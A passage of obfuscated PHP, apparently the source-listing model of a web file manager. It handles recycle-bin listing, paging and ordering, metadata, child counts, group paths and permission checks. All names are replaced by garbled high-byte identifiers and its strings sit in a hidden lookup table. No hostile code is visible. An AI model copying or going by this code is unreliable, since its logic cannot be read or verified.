$âçå£â’[84] => $¢ê‹è¿”[$âçå£â’[84]], $âçå£â’[33] => $¢ê‹è¿”[$âçå£â’[33]], $âçå£â’[86] => array($âçå£â’[427] => 1), $âçå£â’[201] => !0); if ($¢ê‹è¿”[$âçå£â’[33]] == $âçå£â’[199]) { $“à»¼å°[] = $Á÷¾§ÎÛ; } if ($¢ê‹è¿”[$âçå£â’[33]] == $âçå£â’[75]) { $ÕÉÀèï®[] = $Á÷¾§ÎÛ; } continue; } $ÉÏÚ€Š½[] = $³ò¢¿˜; } if ($ÉÏÚ€Š½) { $íÇîºµ = $this->listSource(array($âçå£â’[417] => array($âçå£â’[418], $ÉÏÚ€Š½))); } $íÇîºµ = $íÇîºµ ? $íÇîºµ : array($âçå£â’[82] => array(), $âçå£â’[83] => array()); $íÇîºµ[$âçå£â’[82]] = array_merge($íÇîºµ[$âçå£â’[82]], $ÕÉÀèï®); $íÇîºµ[$âçå£â’[83]] = array_merge($íÇîºµ[$âçå£â’[83]], $“à»¼å°); if (isset($íÇîºµ[$âçå£â’[366]]) && count($ÉÏÚ€Š½) == $íÇîºµ[$âçå£â’[366]][$âçå£â’[367]]) { return $íÇîºµ; } $ÇÃ“äÄ = array(); $‚Ñ¸ô£ş = array_to_keyvalue($íÇîºµ[$âçå£â’[82]], $âçå£â’[12], $âçå£â’[402]); $ÆÚ©«‡ = array_to_keyvalue($íÇîºµ[$âçå£â’[83]], $âçå£â’[12], $âçå£â’[402]); $ áú÷Ãî = array_merge($ÆÚ©«‡, $‚Ñ¸ô£ş); foreach ($ÉÏÚ€Š½ as $ÉÈ…Ş¸×) { if (!in_array($ÉÈ…Ş¸×, $ áú÷Ãî)) { $ÇÃ“äÄ[] = $ÉÈ…Ş¸×; } } if ($ÇÃ“äÄ) { Model($âçå£â’[428])->removeBySource($ÇÃ“äÄ); } return $íÇîºµ; } public function listUserRecycle() { $œˆü²¹’ =& $_SERVER[ñˆ‹ß¿÷]; $ãåòë‘¤ = Model($œˆü²¹’[429])->listData(); if (!$ãåòë‘¤) { return array(); } $”“æõ±À = array($œˆü²¹’[417] => array($œˆü²¹’[418], $ãåòë‘¤), $œˆü²¹’[430] => 1); return $this->listSource($”“æõ±À); } public function listSource($€¨©Â—è, $ˆçıä– = 3000, $Êª™¡±  = false) { $ôéÄ»öÉ =& $_SERVER[ñˆ‹ß¿÷]; if (!isset($€¨©Â—è[$ôéÄ»öÉ[431]])) { $€¨©Â—è[$ôéÄ»öÉ[431]] = 0; } if (isset($€¨©Â—è[$ôéÄ»öÉ[432]]) && $€¨©Â—è[$ôéÄ»öÉ[432]] == $ôéÄ»öÉ[197]) { $€¨©Â—è[$ôéÄ»öÉ[412]] = array($ôéÄ»öÉ[331], $ôéÄ»öÉ[433]); } $¿ëøÄ™ = $ôéÄ»öÉ[434]; $§ƒİë«Å = $this->field($¿ëøÄ™)->_makeOrder()->where($€¨©Â—è)->selectPage($ˆçıä–); $this->_listPageCheck($§ƒİë«Å, $¿ëøÄ™, $€¨©Â—è); $this->_listDataApply($§ƒİë«Å[$ôéÄ»öÉ[369]], $Êª™¡± ); $this->_listMake($§ƒİë«Å); return $§ƒİë«Å; } private function _listPageCheck(&$ƒ¶¦¹¸, $Ú‚Şèë, $Şøşá”) { $Ñ»æ¼Î¹ =& $_SERVER[ñˆ‹ß¿÷]; if (!is_array($ƒ¶¦¹¸[$Ñ»æ¼Î¹[366]])) { return; } $âê§æ¥ê = $ƒ¶¦¹¸[$Ñ»æ¼Î¹[366]]; if ($âê§æ¥ê[$Ñ»æ¼Î¹[368]] <= 1) { return; } if ($âê§æ¥ê[$Ñ»æ¼Î¹[367]] >= 100000) { return; } if (Model($Ñ»æ¼Î¹[435])->get($Ñ»æ¼Î¹[436]) != $Ñ»æ¼Î¹[437]) { return; } $Ú‚Şèë = str_replace(array($Ñ»æ¼Î¹[53], $Ñ»æ¼Î¹[342], $Ñ»æ¼Î¹[231]), $Ñ»æ¼Î¹[12], $Ú‚Şèë); $Ú‚Şèë = $Ñ»æ¼Î¹[438] . str_replace($Ñ»æ¼Î¹[50], $Ñ»æ¼Î¹[439], $Ú‚Şèë) . $Ñ»æ¼Î¹[440]; $ì“§ˆ© = $Ñ»æ¼Î¹[441]; $ì“§ˆ© = $ì“§ˆ© . $Ñ»æ¼Î¹[442]; $¯÷Ó³Ğ = $âê§æ¥ê[$Ñ»æ¼Î¹[363]] * ($âê§æ¥ê[$Ñ»æ¼Î¹[353]] - 1) . $Ñ»æ¼Î¹[50] . $âê§æ¥ê[$Ñ»æ¼Î¹[363]]; $¡ª•ó°Õ = $this->_makeOrder(!0); $àÁ¾ìß› = $Ñ»æ¼Î¹[438] . str_replace($Ñ»æ¼Î¹[50], $Ñ»æ¼Î¹[439], $¡ª•ó°Õ[0]); if (strpos($àÁ¾ìß›, $Ñ»æ¼Î¹[443])) { $àÁ¾ìß› = str_replace($Ñ»æ¼Î¹[443], $Ñ»æ¼Î¹[444], $àÁ¾ìß›); } else { $àÁ¾ìß› .= $Ñ»æ¼Î¹[445] . $¡ª•ó°Õ[1]; } $Ì™»Â‚® = array(); foreach ($Şøşá” as $Ú•¡‰®î => $óÃ§ØÆ¦) { $Ì™»Â‚®[$Ñ»æ¼Î¹[438] . $Ú•¡‰®î] = $óÃ§ØÆ¦; } $this->alias($Ñ»æ¼Î¹[446])->field($Ú‚Şèë)->limit($¯÷Ó³Ğ)->order($àÁ¾ìß›); $¹ÚŠ¸¢› = $this->join($ì“§ˆ©)->where($Ì™»Â‚®)->select(); if ($¹ÚŠ¸¢›) { $ƒ¶¦¹¸[$Ñ»æ¼Î¹[369]] = $¹ÚŠ¸¢›; } } protected function _makeOrder($©ÖîòĞô = false) { $©ùäì»ş =& $_SERVER[ñˆ‹ß¿÷]; $³üº»£ = Model($©ùäì»ş[447])->get($©ùäì»ş[448]); $’£”­ø« = Model($©ùäì»ş[447])->get($©ùäì»ş[449]); $—Ë¾òã‚ = array($©ùäì»ş[450] => $©ùäì»ş[451], $©ùäì»ş[452] => $©ùäì»ş[453]); $„ÂŠ¦ŠÎ = array($©ùäì»ş[32] => $©ùäì»ş[32], $©ùäì»ş[76] => $©ùäì»ş[76], $©ùäì»ş[174] => $©ùäì»ş[412], $©ùäì»ş[454] => $©ùäì»ş[454], $©ùäì»ş[455] => $©ùäì»ş[456], $©ùäì»ş[200] => $©ùäì»ş[200], $©ùäì»ş[85] => $©ùäì»ş[85]); $ÙŠ¿·Åò = Input::get($©ùäì»ş[457], $©ùäì»ş[7], $³üº»£, array_keys($„ÂŠ¦ŠÎ)); $¡õé©‘§ = Input::get($©ùäì»ş[458], $©ùäì»ş[7], $’£”­ø«, array_keys($—Ë¾òã‚)); if (!in_array($ÙŠ¿·Åò, array_keys($„ÂŠ¦ŠÎ))) { $ÙŠ¿·Åò = $©ùäì»ş[32]; } if (!in_array($¡õé©‘§, array_keys($—Ë¾òã‚))) { $ÙŠ¿·Åò = $©ùäì»ş[450]; } if ($ÙŠ¿·Åò == $©ùäì»ş[32]) { } $×÷¾˜Š¢ = $©ùäì»ş[459] . $„ÂŠ¦ŠÎ[$ÙŠ¿·Åò] . $©ùäì»ş[53] . $—Ë¾òã‚[$¡õé©‘§]; $×÷¾˜Š¢ = rtrim(trim($×÷¾˜Š¢), $©ùäì»ş[50]); if ($©ÖîòĞô) { return array($×÷¾˜Š¢, $—Ë¾òã‚[$¡õé©‘§]); } return $this->order($×÷¾˜Š¢); } protected function _listDataApplyItem($»¶øØ§, $Ãı“Æê = false) { $ğ„úäÌ = array($»¶øØ§); $this->_listDataApply($ğ„úäÌ, $Ãı“Æê); return $ğ„úäÌ[0]; } protected function _listDataApply(&$¸¤ªÔÖâ, $Éñ²Õƒ“ = false) { $¼«¨¶Â÷ =& $_SERVER[ñˆ‹ß¿÷]; if (!$¸¤ªÔÖâ) { $¸¤ªÔÖâ = array(); return; } $ÄÀè…Š³ = array_to_keyvalue($¸¤ªÔÖâ, $¼«¨¶Â÷[12], $¼«¨¶Â÷[402]); $ÄÀè…Š³ = array_unique($ÄÀè…Š³); $this->_listSourceCache($¸¤ªÔÖâ); if (!$Éñ²Õƒ“) { $this->_listAppendMeta($¸¤ªÔÖâ, $ÄÀè…Š³); $this->_listAppendFileMeta($¸¤ªÔÖâ, $ÄÀè…Š³); $this->_listAppendChildren($¸¤ªÔÖâ, $ÄÀè…Š³); } $this->_listAppendPath($¸¤ªÔÖâ); $this->_listAppendAuth($¸¤ªÔÖâ); $this->_listAppendSourceInfo($¸¤ªÔÖâ, $ÄÀè…Š³); $this->_listAppendUser($¸¤ªÔÖâ); $this->_listFilterInfo($¸¤ªÔÖâ, $Éñ²Õƒ“); $this->_listAppendAuthSecret($¸¤ªÔÖâ); } protected function _listSourceCache($ß¾÷÷ï†) { $Õçøç˜Ù =& $_SERVER[ñˆ‹ß¿÷]; foreach ($ß¾÷÷ï† as $ —±ÁŞ) { self::$cacheSourceInfo[$Õçøç˜Ù[460] . $ —±ÁŞ[$Õçøç˜Ù[402]]] = $ —±ÁŞ; } } protected function _listFilterInfo(&$³ïä •Ö, $¸ÅŠªŠ” = false) { $ÖÃéÕøµ =& $_SERVER[ñˆ‹ß¿÷]; foreach ($³ïä •Ö as &$„¦ı»ß­) { $„¦ı»ß­ = $this->pathInfoFilter($„¦ı»ß­); self::$cachePathInfo[$ÖÃéÕøµ[461] . intval($¸ÅŠªŠ”) . $ÖÃéÕøµ[386] . $„¦ı»ß­[$ÖÃéÕøµ[402]]] = $„¦ı»ß­; } unset($„¦ı»ß­); } protected function _listMake(&$ÇÊÁÜãË) { $òÓÌĞ =& $_SERVER[ñˆ‹ß¿÷]; $ÇÊÁÜãË[$òÓÌĞ[82]] = array(); $ÇÊÁÜãË[$òÓÌĞ[83]] = array(); foreach ($ÇÊÁÜãË[$òÓÌĞ[369]] as $¤Îø¾»¯) { $”­Æ„¼í = $¤Îø¾»¯[$òÓÌĞ[410]] == 1 ? $òÓÌĞ[82] : $òÓÌĞ[83]; $ÇÊÁÜãË[$”­Æ„¼í][] = $¤Îø¾»¯; } unset($ÇÊÁÜãË[$òÓÌĞ[369]]); } protected function _listAppendMeta(&$¡°¾ ©ú, $êÏ®¦¤‰) { $Ç­ÖïœÈ =& $_SERVER[ñˆ‹ß¿÷]; $À¾’Šù = array($Ç­ÖïœÈ[417] => array($Ç­ÖïœÈ[418], $êÏ®¦¤‰)); $™©È’  = Model($Ç­ÖïœÈ[462])->field($Ç­ÖïœÈ[463])->where($À¾’Šù)->select(); if (!$™©È’ ) { return; } $’¡Ğ†«« = array($Ç­ÖïœÈ[464], $Ç­ÖïœÈ[465], $Ç­ÖïœÈ[444]); $íÔøóº’ = array(); foreach ($™©È’  as $˜âæ¼ç) { if (!isset($íÔøóº’[$˜âæ¼ç[$Ç­ÖïœÈ[402]]])) { $íÔøóº’[$˜âæ¼ç[$Ç­ÖïœÈ[402]]] = array(); } if (in_array($˜âæ¼ç[$Ç­ÖïœÈ[94]], $’¡Ğ†««)) { continue; } $íÔøóº’[$˜âæ¼ç[$Ç­ÖïœÈ[402]]][$˜âæ¼ç[$Ç­ÖïœÈ[94]]] = $˜âæ¼ç[$Ç­ÖïœÈ[374]]; } foreach ($¡°¾ ©ú as &$·›ÇÏ¤ƒ) { $·›ÇÏ¤ƒ[$Ç­ÖïœÈ[466]] = !1; if (isset($íÔøóº’[$·›ÇÏ¤ƒ[$Ç­ÖïœÈ[402]]])) { $·›ÇÏ¤ƒ[$Ç­ÖïœÈ[466]] = $íÔøóº’[$·›ÇÏ¤ƒ[$Ç­ÖïœÈ[402]]]; } if ($this->fileIsLock($·›ÇÏ¤ƒ) && $·›ÇÏ¤ƒ[$Ç­ÖïœÈ[413]]) { $†ıçß² = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $·›ÇÏ¤ƒ[$Ç­ÖïœÈ[413]][$Ç­ÖïœÈ[414]] = AuthModel::authDisable($·›ÇÏ¤ƒ[$Ç­ÖïœÈ[413]][$Ç­ÖïœÈ[414]], $†ıçß²); $·›ÇÏ¤ƒ[$Ç­ÖïœÈ[413]][$Ç­ÖïœÈ[467]][$Ç­ÖïœÈ[413]] = $·›ÇÏ¤ƒ[$Ç­ÖïœÈ[413]][$Ç­ÖïœÈ[414]]; } } unset($·›ÇÏ¤ƒ); } protected function _listAppendFileMeta(&$ª¶äÛ“ä, $Æê—úéÇ) { $ç¿ÎĞ¦ =& $_SERVER[ñˆ‹ß¿÷]; $ç¹ß‹ø = array_to_keyvalue($ª¶äÛ“ä, $ç¿ÎĞ¦[12], $ç¿ÎĞ¦[468]); $ç¹ß‹ø = array_filter(array_unique($ç¹ß‹ø)); if (!$ç¹ß‹ø) { return; } $µò”£Œà = array($ç¿ÎĞ¦[469] => array($ç¿ÎĞ¦[418], $ç¹ß‹ø)); $‚úæ¡ÑÇ = $ç¿ÎĞ¦[470]; $Öñú¨ãÚ = Model($ç¿ÎĞ¦[471])->field($‚úæ¡ÑÇ)->where($µò”£Œà)->select(); $Öñú¨ãÚ = array_to_keyvalue($Öñú¨ãÚ, $ç¿ÎĞ¦[468]); $¯ƒÏšØÕ = Model($ç¿ÎĞ¦[472])->field($ç¿ÎĞ¦[473])->where($µò”£Œà)->select(); $¯ƒÏšØÕ = $¯ƒÏšØÕ ? $¯ƒÏšØÕ : array(); $âÀ©û = array(); foreach ($¯ƒÏšØÕ as $Í€àêö) { if (!isset($âÀ©û[$Í€àêö[$ç¿ÎĞ¦[468]]])) { $âÀ©û[$Í€àêö[$ç¿ÎĞ¦[468]]] = array(); } $âÀ©û[$Í€àêö[$ç¿ÎĞ¦[468]]][$Í€àêö[$ç¿ÎĞ¦[94]]] = $Í€àêö[$ç¿ÎĞ¦[374]]; } foreach ($ª¶äÛ“ä as &$˜€‚Ï·) { $†ù§›Ôõ = $˜€‚Ï·[$ç¿ÎĞ¦[468]]; if (!$†ù§›Ôõ || !is_array($Öñú¨ãÚ[$†ù§›Ôõ])) { continue; } $×©¼¶¢Ó = $Öñú¨ãÚ[$†ù§›Ôõ]; $×©¼¶¢Ó[$ç¿ÎĞ¦[76]] = $˜€‚Ï·[$ç¿ÎĞ¦[76]]; $×©¼¶¢Ó[$ç¿ÎĞ¦[32]] = $˜€‚Ï·[$ç¿ÎĞ¦[32]]; if (!isset(self::$cacheFileInfo[$ç¿ÎĞ¦[474] . $†ù§›Ôõ])) { self::$cacheFileInfo[$ç¿ÎĞ¦[474] . $†ù§›Ôõ] = array_merge(array(), $×©¼¶¢Ó); } unset($Öñú¨ãÚ[$†ù§›Ôõ][$ç¿ÎĞ¦[84]]); $’ª‘Ë° = is_array($âÀ©û[$†ù§›Ôõ]) ? $âÀ©û[$†ù§›Ôõ] : array(); $˜€‚Ï·[$ç¿ÎĞ¦[170]] = array_merge($’ª‘Ë°, $Öñú¨ãÚ[$†ù§›Ôõ]); if (isset($˜€‚Ï·[$ç¿ÎĞ¦[170]][$ç¿ÎĞ¦[169]])) { $˜€‚Ï·[$ç¿ÎĞ¦[169]] = json_decode($˜€‚Ï·[$ç¿ÎĞ¦[170]][$ç¿ÎĞ¦[169]], !0); unset($˜€‚Ï·[$ç¿ÎĞ¦[170]][$ç¿ÎĞ¦[169]]); } } unset($˜€‚Ï·); } protected function _listAppendSourceInfo(&$÷Í§Ïğ , $Œ„ÉÚ ) { $ö£µ©¥ò =& $_SERVER[ñˆ‹ß¿÷]; if (!defined($ö£µ©¥ò[475])) { return; } $–ÇïÕØ = Model($ö£µ©¥ò[476])->listData(); $¬ æëÄ‹ = Model($ö£µ©¥ò[425])->listData(); $ëÉ©øÚ = Model($ö£µ©¥ò[415])->listData(); $îÈ‡ÈÕ = Model($ö£µ©¥ò[477])->listSimple(); $ï÷¨±ö = array_to_keyvalue($–ÇïÕØ, $ö£µ©¥ò[399]); $üºË‹Ä = array_to_keyvalue_group($¬ æëÄ‹, $ö£µ©¥ò[84], $ö£µ©¥ò[426]); $àõ–†Å„ = array_to_keyvalue($ëÉ©øÚ, $ö£µ©¥ò[84]); $æ””áàŞ = array_to_keyvalue_group($îÈ‡ÈÕ, $ö£µ©¥ò[402]); foreach ($÷Í§Ïğ  as &$ªü›¥¢) { $ªü›¥¢[$ö£µ©¥ò[86]] = array($ö£µ©¥ò[478] => 0, $ö£µ©¥ò[479] => 0, $ö£µ©¥ò[480] => 0); if (isset($àõ–†Å„[$ªü›¥¢[$ö£µ©¥ò[402]]])) { $ªü›¥¢[$ö£µ©¥ò[86]][$ö£µ©¥ò[481]] = 1; $ªü›¥¢[$ö£µ©¥ò[86]][$ö£µ©¥ò[482]] = $àõ–†Å„[$ªü›¥¢[$ö£µ©¥ò[402]]][$ö£µ©¥ò[32]]; } if ($üºË‹Ä && $ï÷¨±ö && isset($üºË‹Ä[$ªü›¥¢[$ö£µ©¥ò[402]]])) { $ªü›¥¢[$ö£µ©¥ò[86]][$ö£µ©¥ò[483]] = array(); foreach ($üºË‹Ä[$ªü›¥¢[$ö£µ©¥ò[402]]] as $…ÚçñªÍ) { $ñ¡îõ›ò = $ï÷¨±ö[$…ÚçñªÍ]; $ªü›¥¢[$ö£µ©¥ò[86]][$ö£µ©¥ò[483]][] = array($ö£µ©¥ò[484] => $ñ¡îõ›ò[$ö£µ©¥ò[399]], $ö£µ©¥ò[420] => $ñ¡îõ›ò[$ö£µ©¥ò[32]], $ö£µ©¥ò[485] => $ñ¡îõ›ò[$ö£µ©¥ò[486]]); } } if ($æ””áàŞ && isset($æ””áàŞ[$ªü›¥¢[$ö£µ©¥ò[402]]])) { $ªü›¥¢[$ö£µ©¥ò[86]][$ö£µ©¥ò[487]] = array(); foreach ($æ””áàŞ[$ªü›¥¢[$ö£µ©¥ò[402]]] as $•ıµÅø›) { $ªü›¥¢[$ö£µ©¥ò[86]][$ö£µ©¥ò[487]] = array($ö£µ©¥ò[488] => $•ıµÅø›[$ö£µ©¥ò[489]], $ö£µ©¥ò[490] => $•ıµÅø›[$ö£µ©¥ò[491]], $ö£µ©¥ò[492] => $•ıµÅø›[$ö£µ©¥ò[402]], $ö£µ©¥ò[493] => $•ıµÅø›[$ö£µ©¥ò[494]], $ö£µ©¥ò[495] => $•ıµÅø›[$ö£µ©¥ò[496]], $ö£µ©¥ò[497] => $•ıµÅø›[$ö£µ©¥ò[497]], $ö£µ©¥ò[498] => $•ıµÅø›[$ö£µ©¥ò[498]]); } } } unset($ªü›¥¢); return $÷Í§Ïğ ; } protected function _listAppendChildren(&$®¸²€‹Ö, $¡¾¬ù¹ö) { $ïãÌ”é =& $_SERVER[ñˆ‹ß¿÷]; $ àÛş‹’ = array(); $¿£õŸáİ = array($ïãÌ”é[207] => 0, $ïãÌ”é[208] => 0); foreach ($®¸²€‹Ö as &$Ç²¬) { if (!$Ç²¬[$ïãÌ”é[410]]) { continue; } $ àÛş‹’[] = $Ç²¬[$ïãÌ”é[402]]; } unset($Ç²¬); if (!$ àÛş‹’) { return; } $û×­”® = array($ïãÌ”é[432] => array($ïãÌ”é[7], $ àÛş‹’), $ïãÌ”é[431] => 0); $’¹ß´âÚ = array($ïãÌ”é[432], $ïãÌ”é[410], $ïãÌ”é[499] => $ïãÌ”é[500]); $â—çÌéÖ = $this->field($’¹ß´âÚ)->where($û×­”®)->group($ïãÌ”é[501])->select(); $„èÑ‘£¦ = array(); foreach ($â—çÌéÖ as $ê˜²åà©) { $Ùè¸†î = $ê˜²åà©[$ïãÌ”é[432]]; $†ÆÊàÅ = $ê˜²åà©[$ïãÌ”é[410]] == $ïãÌ”é[88] ? $ïãÌ”é[208] : $ïãÌ”é[207]; if (!isset($„èÑ‘£¦[$Ùè¸†î])) { $„èÑ‘£¦[$Ùè¸†î] = array($ïãÌ”é[207] => 0, $ïãÌ”é[208] => 0); } $„èÑ‘£¦[$Ùè¸†î][$†ÆÊàÅ] += $ê˜²åà©[$ïãÌ”é[500]]; } foreach ($®¸²€‹Ö as &$Ç²¬) { if (!$Ç²¬[$ïãÌ”é[410]]) { continue; } $¶äšşÖ’ = is_array($„èÑ‘£¦[$Ç²¬[$ïãÌ”é[402]]]) ? $„èÑ‘£¦[$Ç²¬[$ïãÌ”é[402]]] : $¿£õŸáİ; $Ç²¬[$ïãÌ”é[208]] = $¶äšşÖ’[$ïãÌ”é[208]]; $Ç²¬[$ïãÌ”é[207]] = $¶äšşÖ’[$ïãÌ”é[207]]; unset($Ç²¬[$ïãÌ”é[412]]); } unset($Ç²¬); } protected function _listAppendAuth(&$å‡ÔÚçˆ) { $…Ü”Ó¡´ =& $_SERVER[ñˆ‹ß¿÷]; if (!defined($…Ü”Ó¡´[475])) { return; } $Û–Ë¦å’ = array(); foreach ($å‡ÔÚçˆ as $ÃÖ¾ÁÒ´) { if ($ÃÖ¾ÁÒ´[$…Ü”Ó¡´[411]] == self::TYPE_GROUP) { $Û–Ë¦å’[] = $ÃÖ¾ÁÒ´[$…Ü”Ó¡´[402]]; } } if (!$Û–Ë¦å’) { return; } $ŸøŠÀÚ = array_to_keyvalue($å‡ÔÚçˆ, $…Ü”Ó¡´[402]); $šÙ±œÎØ = Model($…Ü”Ó¡´[502])->getSourceList($Û–Ë¦å’, $ŸøŠÀÚ); $°ÏŠóÒÕ = $GLOBALS[$…Ü”Ó¡´[503]] == 1; foreach ($å‡ÔÚçˆ as $øø£ìƒÃ => &$ÃÖ¾ÁÒ´) { $ÃÖ¾ÁÒ´[$…Ü”Ó¡´[413]] = $šÙ±œÎØ[$ÃÖ¾ÁÒ´[$…Ü”Ó¡´[402]]]; if (!$ÃÖ¾ÁÒ´[$…Ü”Ó¡´[413]] && $ÃÖ¾ÁÒ´[$…Ü”Ó¡´[411]] == self::TYPE_GROUP) { $ÃÖ¾ÁÒ´[$…Ü”Ó¡´[413]] = Action($…Ü”Ó¡´[504])->pathGroupAuthMake($ÃÖ¾ÁÒ´[$…Ü”Ó¡´[505]]); if (!$ÃÖ¾ÁÒ´[$…Ü”Ó¡´[413]] && !$°ÏŠóÒÕ) { $ÃÖ¾ÁÒ´[$…Ü”Ó¡´[202]] = !1; $ÃÖ¾ÁÒ´[$…Ü”Ó¡´[201]] = !1; } } if ($ÃÖ¾ÁÒ´[$…Ü”Ó¡´[413]]) { $ÃÖ¾ÁÒ´[$…Ü”Ó¡´[202]] = AuthModel::authCheckEdit($ÃÖ¾ÁÒ´[$…Ü”Ó¡´[413]][$…Ü”Ó¡´[414]]); $ÃÖ¾ÁÒ´[$…Ü”Ó¡´[201]] = AuthModel::authCheckView($ÃÖ¾ÁÒ´[$…Ü”Ó¡´[413]][$…Ü”Ó¡´[414]]); } $this->groupPathDisplay($ÃÖ¾ÁÒ´); } unset($ÃÖ¾ÁÒ´); } public function _listAppendAuthSecret(&$øƒÇêÆÕ) { $Ñ‚í³‚È =& $_SERVER[ñˆ‹ß¿÷]; if (Model($Ñ‚í³‚È[435])->get($Ñ‚í³‚È[506]) != $Ñ‚í³‚È[88]) { return; } static $Åß«¡ÏÔ = false; if (!$Åß«¡ÏÔ) { $ê¤¢µ•­ = Model($Ñ‚í³‚È[507]); $Û“ü±´ = Model($Ñ‚í³‚È[508]); $Åß«¡ÏÔ = $Û“ü±´->listData(); $Åß«¡ÏÔ = array_to_keyvalue($Åß«¡ÏÔ, $Ñ‚í³‚È[402]); $ÏßÍñµ» = json_decode(Model($Ñ‚í³‚È[435])->get($Ñ‚í³‚È[509]), !0); $ÏßÍñµ» = array_to_keyvalue($ÏßÍñµ», $Ñ‚í³‚È[399]); foreach ($Åß«¡ÏÔ as $ã‡²¶Ñ => $·Òéã”â) { $ôÏªÔ¨ì = $ÏßÍñµ»[$·Òéã”â[$Ñ‚í³‚È[510]]]; if (!$ôÏªÔ¨ì) { $Û“ü±´->remove($·Òéã”â[$Ñ‚í³‚È[399]]); unset($Åß«¡ÏÔ[$ã‡²¶Ñ]); continue; } $İãº¤“ = $ê¤¢µ•­->listData($ôÏªÔ¨ì[$Ñ‚í³‚È[413]]); if (!$İãº¤“) { $Û“ü±´->remove($·Òéã”â[$Ñ‚í³‚È[399]]); unset($Åß«¡ÏÔ[$ã‡²¶Ñ]); continue; } $·Òéã”â[$Ñ‚í³‚È[413]] = $İãº¤“; $·Òéã”â[$Ñ‚í³‚È[511]] = $ôÏªÔ¨ì; $·Òéã”â[$Ñ‚í³‚È[512]] = Model($Ñ‚í³‚È[513])->getInfoSimpleOuter($·Òéã”â[$Ñ‚í³‚È[454]]); $Åß«¡ÏÔ[$ã‡²¶Ñ] = $·Òéã”â; } } $ÔÔİ¡‘ = defined($Ñ‚í³‚È[514]) ? USER_ID : $Ñ‚í³‚È[12]; $ŠÂ³½œ™ = array(); $–÷ÌÇîî = $this->_listAppendPath($ŠÂ³½œ™, !0); foreach ($øƒÇêÆÕ as $ã‡²¶Ñ => &$·Òéã”â) { if (!is_array($·Òéã”â[$Ñ‚í³‚È[413]])) { continue; } if ($·Òéã”â[$Ñ‚í³‚È[411]] != $Ñ‚í³‚È[515]) { continue; } if (isset($Åß«¡ÏÔ[$·Òéã”â[$Ñ‚í³‚È[402]]])) { $ÍéÄû® = $Åß«¡ÏÔ[$·Òéã”â[$Ñ‚í³‚È[402]]]; if (!is_array($·Òéã”â[$Ñ‚í³‚È[466]])) { $·Òéã”â[$Ñ‚í³‚È[466]] = array(); } $·Òéã”â[$Ñ‚í³‚È[466]][$Ñ‚í³‚È[516]] = $ÍéÄû®[$Ñ‚í³‚È[510]]; $·Òéã”â[$Ñ‚í³‚È[413]][$Ñ‚í³‚È[517]] = $ÍéÄû®; $·Òéã”â[$Ñ‚í³‚È[413]][$Ñ‚í³‚È[518]] = $·Òéã”â[$Ñ‚í³‚È[519]]; $·Òéã”â[$Ñ‚í³‚È[413]][$Ñ‚í³‚È[520]] = $Ñ‚í³‚È[88]; if ($ÍéÄû®[$Ñ‚í³‚È[454]] != $ÔÔİ¡‘) { $·Òéã”â[$Ñ‚í³‚È[413]][$Ñ‚í³‚È[414]] = $·Òéã”â[$Ñ‚í³‚È[413]][$Ñ‚í³‚È[414]] & $ÍéÄû®[$Ñ‚í³‚È[413]][$Ñ‚í³‚È[413]]; } continue; } $Æäæâß = $this->parentLevelArray($·Òéã”â[$Ñ‚í³‚È[521]]); $¬ïÉÚã = array_reverse($Æäæâß); foreach ($¬ïÉÚã as $ÄóÒâè => $ô…Ûá«ê) { if (!isset($Åß«¡ÏÔ[$ô…Ûá«ê])) { continue; } $ÍéÄû® = $Åß«¡ÏÔ[$ô…Ûá«ê]; $·Òéã”â[$Ñ‚í³‚È[413]][$Ñ‚í³‚È[517]] = $ÍéÄû®; if ($ÍéÄû®[$Ñ‚í³‚È[454]] != $ÔÔİ¡‘) { $·Òéã”â[$Ñ‚í³‚È[413]][$Ñ‚í³‚È[414]] = $·Òéã”â[$Ñ‚í³‚È[413]][$Ñ‚í³‚È[414]] & $ÍéÄû®[$Ñ‚í³‚È[413]][$Ñ‚í³‚È[413]]; } $Ğ„»§Ê = $Ñ‚í³‚È[12]; $±…†´¶ = count($Æäæâß) - $ÄóÒâè; for ($Ò®À‚´Ì = 0; $Ò®À‚´Ì < $±…†´¶; $Ò®À‚´Ì++) { if (!isset($–÷ÌÇîî[$Æäæâß[$Ò®À‚´Ì]])) { $Ğ„»§Ê = $Ñ‚í³‚È[12]; break; } $Ğ„»§Ê = $Ğ„»§Ê . rtrim($–÷ÌÇîî[$Æäæâß[$Ò®À‚´Ì]], $Ñ‚í³‚È[8]) . $Ñ‚í³‚È[8]; } $·Òéã”â[$Ñ‚í³‚È[413]][$Ñ‚í³‚È[518]] = rtrim($Ğ„»§Ê, $Ñ‚í³‚È[8]) . $Ñ‚í³‚È[8]; break; } } unset($·Òéã”â); } public function groupPathDisplay(&$îˆ›œ) { $¬‹¾„¢ =& $_SERVER[ñˆ‹ß¿÷]; if ($îˆ›œ[$¬‹¾„¢[411]] != self::TYPE_GROUP) { return; } $Õì£Ğ¶ç = Model($¬‹¾„¢[522])->getInfo($îˆ›œ[$¬‹¾„¢[505]]); $Ñ…´‰° = $this->parentLevelArray($Õì£Ğ¶ç[$¬‹¾„¢[521]]); $Íã¹ş«¥ = $¬‹¾„¢[12]; foreach ($Ñ…´‰° as $ˆæã—) { $ë¨ùšæ = Model($¬‹¾„¢[522])->getInfo($ˆæã—); $Íã¹ş«¥ .= $ë¨ùšæ[$¬‹¾„¢[86]][$¬‹¾„¢[402]] . $¬‹¾„¢[50]; } $îˆ›œ[$¬‹¾„¢[523]] = $Õì£Ğ¶ç[$¬‹¾„¢[432]]; $îˆ›œ[$¬‹¾„¢[524]] = $Õì£Ğ¶ç[$¬‹¾„¢[521]]; $îˆ›œ[$¬‹¾„¢[525]] = $Õì£Ğ¶ç[$¬‹¾„¢[526]]; $îˆ›œ[$¬‹¾„¢[527]] = $Íã¹ş«¥ . $Õì£Ğ¶ç[$¬‹¾„¢[86]][$¬‹¾„¢[402]]; } protected function _listAppendPath(&$¦Ì½åËå, $’ğ÷û¯ò = false) { $ñÂıúÌ¸ =& $_SERVER[ñˆ‹ß¿÷]; static $¹ÜÓÑïù = array(); $¦µåŞà = array(); $á öíĞì = array(); if ($’ğ÷û¯ò) { return $¹ÜÓÑïù; } foreach ($¦Ì½åËå as &$üêÄ‡ñœ) { $÷İÊâµ = $üêÄ‡ñœ[$ñÂıúÌ¸[402]]; if ($üêÄ‡ñœ[$ñÂıúÌ¸[410]] == $ñÂıúÌ¸[88] && $üêÄ‡ñœ[$ñÂıúÌ¸[432]] != 0) { $¹ÜÓÑïù[$÷İÊâµ] = $üêÄ‡ñœ[$ñÂıúÌ¸[32]]; } if ($üêÄ‡ñœ[$ñÂıúÌ¸[410]] == $ñÂıúÌ¸[88] && 